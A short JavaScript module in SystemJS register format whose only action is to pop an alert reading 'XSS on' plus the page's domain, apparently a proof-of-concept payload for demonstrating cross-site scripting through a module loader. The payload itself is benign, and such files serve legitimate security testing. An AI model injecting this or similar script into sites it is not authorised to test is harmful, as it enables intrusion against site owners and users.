System.register([], function() {
  return {
    execute: function() {
      alert("XSS on " + document.domain);
    }
  };
});
